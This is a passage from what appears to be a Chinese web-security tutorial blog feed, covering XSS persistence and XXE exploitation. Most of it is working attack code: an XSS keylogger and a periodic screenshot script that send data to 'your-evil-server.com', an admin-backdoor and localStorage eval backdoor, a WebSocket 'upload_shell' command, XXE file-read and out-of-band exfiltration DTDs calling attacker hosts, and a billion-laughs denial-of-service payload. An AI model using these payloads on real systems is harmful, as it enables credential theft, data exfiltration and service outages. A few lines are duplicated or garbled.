伪造会话，从而以管理员身份登录后台</p><p><strong>持久化</strong><br>只要您能以管理员身份登录，就可以通过后台修改网站配置，上传新的 WebShell，或者进行其他持久化操作</p><h3 id="xss注入后台管理页面后门"><a href="#xss注入后台管理页面后门" class="headerlink" title="xss注入后台管理页面后门"></a>xss注入后台管理页面后门</h3><p>这种方法更隐蔽持久，它直接在<strong>后台创建可控的后门</strong><br><strong>原理</strong>：很多后台管理管理系统允许管理员自定义页面内容，插入自定义代码或编辑模板</p><p><strong>实现：</strong><br>先进后台再说</p><p><strong>自动化操作：</strong><br>写js脚本，该脚本可以模拟管理员的点击，表单填写和提交操作</p><p><strong>创建新用户</strong><br>脚本可以模拟点击添加新用户的按钮，填写一个新的管理员账户信息<br>例如，用户名：backdoor，密码：pppaaasss，然后保存</p><p><strong>修改配置文件</strong><br>模拟打开系统设置，修改网站配置。允许文件上传，关闭安全限制</p><p><strong>注入payload</strong><br>自动化操作js代码注入xss页面，当管理员访问脚本会在后台静默执行，完成上述操作</p><h3 id="xss-劫持websocket连接"><a href="#xss-劫持websocket连接" class="headerlink" title="xss 劫持websocket连接"></a>xss 劫持websocket连接</h3><p>如果目标网站使用了 WebSocket 来进行实时通信，这也是一个非常高明的攻击点<br><strong>原理：</strong> WebSocket 是一种在客户端和服务器之间建立持久连接的协议。我们可以利用 XSS，劫持 WebSocket 连接，向服务器发送恶意指令<br><strong>实现</strong><br>注入websocket代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 假设原始 WebSocket 连接</span><br><span class="line">var ws = new WebSocket(&quot;wss://target.com/websocket&quot;);</span><br><span class="line">// 劫持</span><br><span class="line">ws.onmessage = function(event) &#123;</span><br><span class="line">// 在这里可以拦截或修改 WebSocket 消息</span><br><span class="line">console.log(&quot;Received message from server: &quot; + event.data);</span><br><span class="line">&#125;;</span><br><span class="line">// 发送恶意指令</span><br><span class="line">ws.onopen = function() &#123;</span><br><span class="line">// 假设服务器允许通过 WebSocket 发送命令</span><br><span class="line">ws.send(JSON.stringify(&#123; &quot;command&quot;: &quot;upload_shell&quot;, &quot;path&quot;: &quot;/uploads/backdoor.php&quot; &#125;));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>持久化</strong><br>当管理员访问该页面，我们可以检查LOCALstorage的标志。如果存在则执行后续的恶意操作（例如加载远程执行js文件）</p><p> <strong>键盘记录</strong><br><strong>原理：</strong> 键盘记录器利用 JavaScript 监听 DOM 事件，例如 <code>keydown</code> 或 <code>keypress</code>，当管理员在后台页面输入账号、密码或其他敏感信息时，脚本会捕获这些按键事件，并将输入的数据发送到攻击者的服务器</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 恶意键盘记录脚本  </span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keydown&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;  </span><br><span class="line"><span class="keyword">var</span> key = event.<span class="property">key</span>;  </span><br><span class="line"><span class="comment">// 将按键数据发送到你的服务器  </span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://your-evil-server.com/log.php?key=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(key));  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>实时数据捕获：</strong> 当管理员在后台登录表单中输入用户名和密码时，每个按键都会被记录下来，并通过 <code>fetch</code> 请求发送到您的服务器<br><strong>持久化：</strong> 这种方法非常隐蔽，因为脚本在后台静默运行。一旦管理员登录，您不仅能获取他们的账号密码，还能实时监控他们在后台进行的任何操作，例如修改文章、上传文件等</p><h3 id="浏览器屏幕截图"><a href="#浏览器屏幕截图" class="headerlink" title="浏览器屏幕截图"></a><strong>浏览器屏幕截图</strong></h3><p><strong>原理：</strong> 利用 HTML5 的 <code>Canvas</code> 和 <code>toDataURL()</code> 方法，我们可以截取 DOM 元素（例如整个页面）的内容，将其转换为图片数据，并发送给攻击者<br><strong>实现：</strong><br><strong>注入 Payload：</strong> 在可写入的 JS 文件中注入以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定时截图并发送  </span></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;  </span><br><span class="line"><span class="title function_">html2canvas</span>(<span class="variable language_">document</span>.<span class="property">body</span>).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">canvas</span>) &#123;  </span><br><span class="line"><span class="comment">// 将 canvas 内容转换为 base64 格式  </span></span><br><span class="line"><span class="keyword">var</span> imageData = canvas.<span class="title function_">toDataURL</span>(<span class="string">&quot;image/png&quot;</span>);  </span><br><span class="line"><span class="comment">// 将图片数据发送到你的服务器  </span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://your-evil-server.com/screenshot.php&#x27;</span>, &#123;  </span><br><span class="line"><span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span><br><span class="line"><span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">image</span>: imageData &#125;)  </span><br><span class="line">&#125;);  </span><br><span class="line">&#125;);  </span><br><span class="line">&#125;, <span class="number">5000</span>); <span class="comment">// 每隔5秒截图一次</span></span><br></pre></td></tr></table></figure><p><strong>依赖库：</strong> 需要注意的是，这个方法通常依赖第三方库，例如 <code>html2canvas.js</code>。您需要将该库的 JS 文件也注入到目标网站中<br><strong>实时监控：</strong> 这种方法可以直观地看到管理员在后台的操作界面，包括他们正在编辑的内容、正在上传的文件等，为您的后续攻击提供丰富的上下文信息。</p><h3 id="利用-XSS-注入持久化-localStorage-后门"><a href="#利用-XSS-注入持久化-localStorage-后门" class="headerlink" title="利用 XSS 注入持久化 localStorage 后门"></a><strong>利用 XSS 注入持久化 localStorage 后门</strong></h3><p>这是一种更具隐蔽性的持久化方法，它不依赖于修改网站文件，而是利用浏览器的本地存储功能<br><strong>原理：</strong> 利用 <code>localStorage</code> 将恶意代码片段持久化存储在管理员的浏览器中<br><strong>实现：</strong><br><strong>一次性注入：</strong> 找到一个XSS漏洞点（例如，一个输入框）。输入以下Payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;  </span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;backdoor&#x27;</span>, <span class="string">&#x27;your_malicious_javascript_code&#x27;</span>);  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>主页面加载器：</strong> 然后在网站的主 JS 文件中，注入一个检查 <code>localStorage</code> 的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查是否存在后门代码  </span></span><br><span class="line"><span class="keyword">var</span> backdoorCode = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;backdoor&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (backdoorCode) &#123;  </span><br><span class="line"><span class="built_in">eval</span>(backdoorCode); <span class="comment">// 执行后门代码  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>持久化：</strong> 只要管理员不清空浏览器缓存，即使您修改的输入框被清理了，后门代码依然会存在于 <code>localStorage</code> 中，并在每次页面加载时被执行</p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h2><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>可利用外部实体读取服务器上的任意文件，例如&#x2F;etc&#x2F;passwd  ，web应用配置文件<br><strong>利用原理</strong>：攻击者在XML文档中定义一个外部实体，实体的值为一个本地文件路径。当XML解析器解析该实体时，就会去读取并返回该文件的内容<br><strong>利用</strong><br>1.先构造恶意dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://10.88.15.58:7777?p=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">//攻击者的服务器地址，%file;会被替换为第一步读取的/flag文件内容</span><br><span class="line">%int; //引用 int 实体，注册 send 实体</span><br><span class="line">%send;  //触发 send 实体，外带数据</span><br><span class="line"></span><br><span class="line">//文件读取 + 数据外带</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br></pre></td></tr></table></figure><p>2.引用实体<br>在 XML 文档的主体中引用该实体<br>例如：<code>&lt;data&gt;&amp;xxe;&lt;/data&gt;</code></p><p>完整示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;  </span><br><span class="line">]&gt;  </span><br><span class="line">&lt;root&gt;  </span><br><span class="line">&lt;data&gt;&amp;xxe;&lt;/data&gt;  </span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>当服务器解析这个 XML 时，在 <code>&lt;data&gt;</code> 标签中就会回显 <code>/etc/passwd</code> 文件的内容</p><h4 id="拒绝服务攻击（Dos）"><a href="#拒绝服务攻击（Dos）" class="headerlink" title="拒绝服务攻击（Dos）"></a>拒绝服务攻击（Dos）</h4><p>利用XXE，通过递归或大量实体引用，使XML解析器进入死循环或消耗大量系统资源，从而导致服务崩溃</p><p>今典示例：十亿笑脸</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个 XML 文件虽然很小，但在解析时，<code>&lt;lolz&gt;</code> 实体会扩展为数十亿个“lol”，消耗巨大的内存和 CPU 资源，最终导致服务器崩溃</p><h4 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h4><p>利用XXE扫描内网开发的端口</p><p><strong>利用原理</strong>：攻击者构造外部实体，让 XML 解析器去尝试连接内网 IP 和端口。如果端口开放，XML 解析会成功或返回特定的错误信息；如果端口关闭，则会返回连接超时等错误，通过错误信息来判断端口状态</p><p><strong>利用</strong><br>定义外部实体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY scan SYSTEM &quot;http://内网IP&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>发送请求</strong>：让服务器去访问内网IP的端口<br>观察响应：如果服务器返回了“连接被拒绝”等信息，说明端口是关闭的，如果返回了“链接超时”或成功连接，则说明端口可能是开发的</p><p><strong>观察响应</strong>：如果服务器放回来“连接被拒绝”等信息，说明端口是关闭的，如果出现<strong>连接超时</strong>或者连接成功，则说明端口可能是开放的</p><h4 id="盲-XXE（Blind-XXE）"><a href="#盲-XXE（Blind-XXE）" class="headerlink" title="盲 XXE（Blind XXE）"></a>盲 XXE（Blind XXE）</h4><p>如果服务器没有将 XML 解析结果回显到前端，攻击者就无法直接看到文件内容，这时就需要利用<strong>带外（Out-of-Band）通信</strong>来获取信息</p><p>利用原理：攻击者利用外部实体向自己的服务器发送请求，并在 URL 中携带需要读取的文件内容</p><p>利用步骤：</p><p>构造外部实体：攻击者在自己的服务器上搭建一个 HTTP 服务来监听请求<br>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % exfiltrate &quot;&lt;!ENTITY % send SYSTEM &#x27;http://attacker.com/?data=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>远程引用：在主 XML 中引用攻击者的 DTD 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><p>当服务器解析这个 DTD 时，就会将 &#x2F;etc&#x2F;passwd 文件的内容发送到攻击者的服务器上</p><h2 id="XXE盲注"><a href="#XXE盲注" class="headerlink" title="XXE盲注"></a>XXE盲注</h2><h4 id="带外请求（OOB）"><a href="#带外请求（OOB）" class="headerlink" title="带外请求（OOB）"></a>带外请求（OOB）</h4><p>先确认是否存在XXR漏洞，即使没有回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">准备dns服务器</span><br><span class="line">推荐用下面这个dnslog和ceye感觉都不怎么好用</span><br><span class="line">https://requestrepo.com/</span><br><span class="line"></span><br><span class="line">使用VPS的python的http</span><br><span class="line">python3 -m http.server port</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766289593092-20727264-1236-4c41-ba98-36e739016c21.jpg" alt="null"></p><p><strong>发送请求：</strong> 将上述 XML 作为请求体发送到目标服务<br><strong>确认存在漏洞：</strong> 如果你的服务器收到了来自目标 IP 的 <code>GET /test</code> 请求，就说明服务器存在 XXE 漏洞</p><h4 id="利用带外请求获取文件内容"><a href="#利用带外请求获取文件内容" class="headerlink" title="利用带外请求获取文件内容"></a>利用带外请求获取文件内容</h4><p>确认漏洞存在后，下一步就是尝试读取服务器上的文件<br><strong>攻击步骤</strong>：<br><strong>构造恶意 DTD 文件</strong>： 在你的攻击服务器上，创建一个 DTD 文件（例如 <code>evil.dtd</code>），内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://你的vpsip或者dns服务器域名.com/?data=%file;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>构造主 XML 请求：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE a [  </span><br><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;http://你的vpsip或者dns服务器域名/evil.dtd&quot;&gt;  </span><br><span class="line">%p1;  </span><br><span class="line">%send;  </span><br><span class="line">]&gt;  </span><br><span class="line">&lt;test&gt;&lt;/test&gt;</span><br></pre></td></tr></table></figure><p><strong>发送请求：</strong><br>当服务器解析主 XML 文件时，它会首先请求 <code>evil.dtd</code> - 解析 <code>evil.dtd</code> 后，它会读取 <code>file:///etc/passwd</code> 的内容，并将其作为 <code>%file</code> 实体的值 - 最后，它会请求 <code>%send</code> 实体，将文件内容作为 <code>GET</code> 参数发送到你的服务器</p><p><strong>接收数据：</strong><br>你会在你的服务器日志中看到类似 <code>GET /?data=root:x:0:0:root:/root:/bin/bash...</code> 的请求，从而获取 <code>/etc/passwd</code> 的内容</p><h4 id="利用参数实体获取错误信息"><a href="#利用参数实体获取错误信息" class="headerlink" title="利用参数实体获取错误信息"></a>利用参数实体获取错误信息</h4><p>当无法通过 HTTP GET 请求直接传输数据时，可以利用 XML 解析器的错误信息来带出数据。这种方法通常用于绕过 WAF 或一些过滤<br><strong>攻击步骤：</strong><br><strong>构造恶意 DTD 文件：</strong> 在你的服务器上创建 DTD 文件，内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">p1</span> <span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!ENTITY &amp;#x25; oob SYSTEM &#x27;http://你的vpsip或者dns服务器域名/?data=%file;&#x27;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>构造主 XML 请求：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://your-evil-server.com/evil.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%p1;</span><br><span class="line">%oob;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><strong>发送请求：</strong>   </p><p>服务器解析主 XML 时，会首先加载 <code>evil.dtd</code> - 然后，它会尝试解析 <code>%p1</code>，其中包含 <code>%oob</code> 的定义 - 由于 <code>%oob</code> 实体引用了 <code>%file</code>，而 <code>%file</code> 是一个文件内容，当 XML 解析器尝试将其解析为 URL 时，会因为语法错误而失败，并抛出错误信息</p><p><strong>这种方法的关键在于，某些 XML 解析器会把完整的错误信息（包括外部实体的内容）带回给客户端，或者将其写入服务器日志。</strong> 虽然不能直接从响应中看到，但可以利用这个特性进行注入</p><h4 id="利用-DNSlog-获取数据"><a href="#利用-DNSlog-获取数据" class="headerlink" title="利用 DNSlog 获取数据"></a>利用 DNSlog 获取数据</h4><p>当目标服务器无法出网，或者 HTTP 协议被严格过滤时，DNSlog 是一个非常好的选择</p><ul><li><strong>攻击步骤：</strong><br><strong>准备 DNSlog 平台：</strong> 获取一个 DNSlog 域名，例如 <code>hacker.dnslog.cn</code><br><strong>构造 XML 请求：</strong></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">p1</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://whoami.hacker.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%p1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>发送请求：</strong><br>服务器解析 XML 时，会尝试解析 <code>whoami</code> 命令的输出，并将其作为子域名，向 <code>hacker.dnslog.cn</code> 发起 DNS 查询<br><strong>查看结果：</strong> 你会在 DNSlog 平台的日志中看到类似 <code>www-data.hacker.dnslog.cn</code> 的查询记录，从而获取到 <code>whoami</code> 命令的输出</p><h2 id="PCDATA-和-CDATA-的区别"><a href="#PCDATA-和-CDATA-的区别" class="headerlink" title="PCDATA 和 CDATA 的区别"></a>PCDATA 和 CDATA 的区别</h2><p><strong>PCDATA</strong></p><p>PCDATA 是 <strong>可解析字符数据</strong>。在XML或HTML中，当解析器遇到 PCDATA 时，它会解析其中的特殊字符。这意味着，如果你的数据中包含 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code> 等字符，解析器会将其视为标签或实体的开始</p><p>例如，在XML中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>这是一个 <span class="symbol">&amp;lt;</span>b<span class="symbol">&amp;gt;</span>粗体<span class="symbol">&amp;lt;</span>/b<span class="symbol">&amp;gt;</span> 文本。<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的 <code>&lt;</code> 会被解析成 <code>&lt;</code>，<code>&gt;</code> 会被解析成 <code>&gt;</code>。如果你在XML元素中直接写入 <code>&lt;script&gt;</code> 标签，解析器会把它当作一个新的节点来处理，而不是纯粹的文本内容。在渗透测试中，如果一个 Web 应用将用户输入作为 PCDATA 处理，但没有进行充分的过滤，攻击者可以注入恶意代码，如 XSS (跨站脚本) 攻击</p><p><strong>CDATA</strong></p><p>CDATA 是 <strong>不可解析字符数据</strong>。与 PCDATA 相反，解析器会将其中的所有内容都视为纯文本，不会对 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code> 等特殊字符进行解析。CDATA 块通常用 <code>&lt;![CDATA[ ... ]]&gt;</code> 语法来定义</p><p>例如，在XML中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script_code</span>&gt;</span>&lt;![CDATA[</span><br><span class="line">    if (x &lt; 10 &amp;&amp; y &gt; 5) &#123;</span><br><span class="line">      alert(&#x27;Hello!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">  ]]&gt;<span class="tag">&lt;/<span class="name">script_code</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>CDATA</code> 块内的所有内容，包括 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>，都会被原封不动地当作字符串来处理。即使代码中包含了类似HTML 标签的字符，解析器也不会将它们当作标签来处理。这使得 CDATA 在需要嵌入包含特殊字符的文本（如代码片段、JavaScript 等）时非常有用</p><table><thead><tr><th>特性</th><th>PCDATA (可解析字符数据)</th><th>CDATA (不可解析字符数据)</th></tr></thead><tbody><tr><td>解析方式</td><td>解析特殊字符（&lt;、&gt;、&amp; 等）</td><td>将所有内容视为纯文本，不解析特殊字符</td></tr><tr><td>主要用途</td><td>包含普通的、可解析的文本内容</td><td>包含代码、脚本或其他含有特殊字符的文本</td></tr><tr><td>攻击风险</td><td>高。如果对用户输入处理不当，容易导致 XSS、XML 实体注入等漏洞。</td><td>低。由于其内容被视为纯文本，它能有效防止特殊字符被解释为标签或代码。</td></tr><tr><td>攻击场景</td><td>当应用程序将用户输入直接放入PCDATA区域，而没有进行充分的转义时，攻击者可以注入  等代码。</td><td>除非应用程序对 CDATA 块本身进行了处理或二次解析，否则在 CDATA 内部直接进行注入攻击是无效的。文件上传文件上传文件上传文件上传</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;p&gt;入门网络安全-从0到1&lt;/p&gt;</summary>
    
    
    
    <category term="网络安全" scheme="https://flypigc.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="web安全" scheme="https://flypigc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>未授权漏洞利用</title>
    <link href="https://flypigc.github.io/2025/12/18/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8/"/>
    <id>https://flypigc.github.io/2025/12/18/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8/</id>
    <published>2025-12-18T14:15:40.857Z</published>
    <updated>2025-12-20T01:58:58.960Z</updated>
    
